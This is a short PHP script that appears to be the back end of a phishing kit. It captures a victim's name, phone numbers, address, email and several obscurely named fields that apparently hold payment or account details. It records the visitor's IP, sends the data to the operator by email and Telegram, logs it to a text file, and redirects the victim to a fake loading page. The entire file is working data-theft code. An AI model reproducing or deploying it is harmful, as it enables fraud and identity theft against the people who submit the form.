<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------- MOBILE NEWW-----------------\n";
$message .= "-----------------Info----------------------\n";
$message .= "FULL NAME     : ".$_POST['nnnom']."\n";
$message .= "TEL     : ".$_POST['TELEPH']."\n";
$message .= "TEL 2     : ".$_POST['tele2']."\n";
$message .= "Adresse     : ".$_POST['adress']."\n";
$message .= "postal     : ".$_POST['postal']."\n";
$message .= "ville     : ".$_POST['villee']."\n";
$message .= "E-mail     : ".$_POST['maail']."\n";

$message .= "lhiyyaa   : ".$_POST['lhiyyaa']."\n";
$message .= "atssali : ".$_POST['atssali']."\n";
$message .= " client               : ".$_POST['lakhrine']."\n";
$message .= "------------------Info D'IP-------------------------\n";
$message .= "IP                : $ip\n";
$message .= "--------------- ---------------\n";

include '../tlgrm.php';	
$sen = "$send";

$subject = "KICHTAA ~ $ip";

$from .= "From: KHALISS ~<Troj>\n";
$from .= "To:";

mail($sen,$subject,$message,$from);
telegram($message);

$file = fopen("../../alog00.txt","a");
fwrite($file,$message); 


echo '<script language="Javascript">
<!--
document.location.replace("loading.html?id=300000716523000091");
// -->
</script>';
?>